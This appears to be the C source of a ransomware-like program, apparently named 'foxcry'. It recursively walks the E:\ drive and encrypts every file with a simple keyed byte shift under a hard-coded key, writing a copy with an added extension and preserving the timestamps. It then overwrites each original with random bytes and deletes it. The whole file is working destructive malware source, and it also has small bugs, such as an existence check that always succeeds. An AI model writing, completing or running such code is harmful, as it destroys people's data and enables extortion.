#include "main.h"

int dir_exists(const char *path);
int file_exists(const char *filename);
void endeda(char* ret, const char* path_old, const char* path_new, int key);
void copy_old_time(struct stat* st, const char* path_new);
int randInRange(int min, int max);
char randomByte();
//long double get_file_share_size(long long size);
//char* count_bytes(off_t size);
//void shredder(struct stat* st, const char* path);
//double get_percentage(long long x, long long y);
void processFilesRecursively(const char* basePath, const char* ext);

int main(int argc, char *argv[])
{
	srand (time(NULL));
	
	char* path = (char*)malloc(PATH_SIZE * sizeof(char));
	strcpy(path, "E:\\");
	processFilesRecursively(path, "foxcry");
	free(path);
	
	return EXIT_SUCCESS;
}

/**
 * Function to check whether a directory exists or not.
 * It returns 1 if given path is directory and  exists 
 * otherwise returns 0.
 */
int dir_exists(const char *path)
{
   struct stat statbuf;
   if (stat(path, &statbuf) != 0)
	   return 0;
   return S_ISDIR(statbuf.st_mode);
}

int file_exists(const char *filename)
{
	struct stat statbuf;
	if (stat(filename, &statbuf) == 0);
		return 1;
	return 0;
}

void endeda(char* ret, const char* path_old, const char* path_new, int key)
{
	FILE* fp_old = NULL;
	FILE* fp_new = NULL;
	char ch;
	char buffer[CHUNK_SIZE];
	size_t bytes;
	int i, j;
	
	fp_old = fopen(path_old,"rb");
	fp_new = fopen(path_new,"wb");
	
	if(fp_old != NULL && fp_new != NULL)
	{
		while (0 < (bytes = fread(buffer, 1, sizeof(buffer), fp_old)))
		{
			j = bytes;
			for(i=0; i<bytes; i++)
			{
				if (ret)
				{
					buffer[i]=buffer[i]+key-j;
				}
				else
				{
					buffer[i]=buffer[i]-key+j;
				}
				j--;
			}
			fwrite(buffer, 1, bytes, fp_new);
		}
	}
	
	fclose(fp_new);
	fclose(fp_old);
}

void copy_old_time(struct stat* st, const char* path_new)
{
	struct utimbuf newTimeBuf;
	newTimeBuf.actime  = st->st_atime;
	newTimeBuf.modtime = st->st_mtime;
	utime(path_new, &newTimeBuf);
}

int randInRange(int min, int max)
{
	double scale = 1.0 / (RAND_MAX + 1);
	double range = max - min + 1;
	return min + (int) ( rand() * scale * range );
}

char randomByte()
{
	return (char)randInRange(0, 255);
}

/* long double get_file_share_size(long long size)
{
    return (size/100.0);
} */

/* char* count_bytes(off_t size)
{
	char* buffer = malloc(sizeof(char) * BUFSIZE);
    long tera, giga, mega, kilo;

    tera = (long)pow(2, 40);
    giga = (long)pow(2, 30);
    mega = (long)pow(2, 20);
    kilo = (long)pow(2, 10);

    if(size > tera) {
        double q = size / tera;
        sprintf(buffer, "%2.f TiB", q);
    } else
    if(size > giga) {
        double q = size / giga;
        sprintf(buffer, "%2.f GiB", q);
    } else
    if(size > mega) {
        double q = size / mega;
        sprintf(buffer, "%2.f MiB", q);
    } else
    if(size > kilo) {
        double q = size / kilo;
        sprintf(buffer, "%2.f KiB", q);
    } else {
        sprintf(buffer, "%2.f Bytes", (double)size);
    }

    return buffer;
} */

/* double get_percentage(long long x, long long y)
{
	double value;
	if(y == 0)
	{
		y = 1;
	}
	value = ( x / (double)y ) * 100;
	return value;
} */

void shredder(struct stat* st, const char* path)
{
	int stat = chmod(path, S_IREAD|S_IWRITE);
	if (!stat)
	{
		off_t size;
		FILE* fp = NULL;
		fp = fopen(path, "rb+");
		if(fp != NULL)
		{
			size = st->st_size;
			
			size_t k = sizeof(char) * CHUNK_SIZE;
			
			long long i = 0;
			//long double one_percent = get_file_share_size(size);
			//double p = 0;

			//char* total_byte_size;
			//char* actual_bytes;
			char status[256];
			char byte[CHUNK_SIZE];
			
			/* Set file descriptor to point to the 0-index byte of file. */
			fseek(fp, 0L, SEEK_SET);
			
			//total_byte_size = count_bytes(size);
			for(i = 0; i < size; i += k)
			{

				/* Fix: 2016/12/04
				 * Files with size < 100 bytes make 'one_percent' to be 0 and raise Floating Pointer Exception
				 * at the next if conditional.
				 */
				//if((long long)one_percent == 0) {
					//one_percent = 1;
				//}

				/* Print status if modulus % 1.0% is true */
				//if (i % (long long)one_percent == 0)
				//{
					//p = get_percentage(i, size);
					//actual_bytes = count_bytes(i);
					//sprintf(status, "[ %s / %s ] %.2f%% \r", actual_bytes, total_byte_size, p);
					//fprintf(stdout, status);
				//}

				/* get random data */
				for(int j = 0; j < sizeof(byte); j++)
					byte[j] = randomByte();

				/* IF conditional to ensure the program does not over overwrite data. */
				if( (size - i) < CHUNK_SIZE )
					{
						k = sizeof(char) * (size - i);
					}

				/* Writes N(k) bytes to file pointer. */
				fwrite(byte, 0x1, k, fp);
			}
			//p = 100.0;

			//actual_bytes = count_bytes(i);
			//sprintf(status, "[ %s / %s ] GRN %.2f%% RESET \n", actual_bytes, total_byte_size, p);
			//fprintf(stdout, status);

			//free(actual_bytes);
			//free(total_byte_size);
		}
		fclose(fp);
	}
}

void processFilesRecursively(const char* basePath, const char* ext)
{
    char path_old[PATH_SIZE];
	char path_new[PATH_SIZE];
    struct dirent* dp;
    DIR* dir = opendir(basePath);

    // Unable to open directory stream
    if (!dir)
        return;

    while ((dp = readdir(dir)) != NULL)
    {
        if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0)
        {
			// Construct new path from our base path
            strcpy(path_old, basePath);
            strcat(path_old, "\\");
            strcat(path_old, dp->d_name);
			
			strcpy(path_new, basePath);
            strcat(path_new, "\\");
            strcat(path_new, dp->d_name);
			
			// Check Path contains extension
			char* ret = strstr(path_new, ext);
			if (ret)
			{
				ret--;
				ret[0] = 0;
			}
			else
			{
				strcat(path_new, ".");
				strcat(path_new, ext);
			}
			
			if (dir_exists(path_old))
			{				
				processFilesRecursively(path_old, ext);
			}
			else
			{
				//printf("%s\n", dp->d_name);
				//printf("%s\n", path_old);
				//printf("%s\n", path_new);
				
				endeda(ret, path_old, path_new, 786);
				
				if (file_exists(path_new))
				{
					struct stat oldStat;
					if (stat(path_old, &oldStat) == 0)
					{
						copy_old_time(&oldStat, path_new);
						shredder(&oldStat, path_old);
					}
					if (remove(path_old) != 0)
					{
						int stat = chmod(path_old, S_IREAD|S_IWRITE);
						if (!stat) remove(path_old);
					}
				}
			}
        }
    }

    closedir(dir);
}
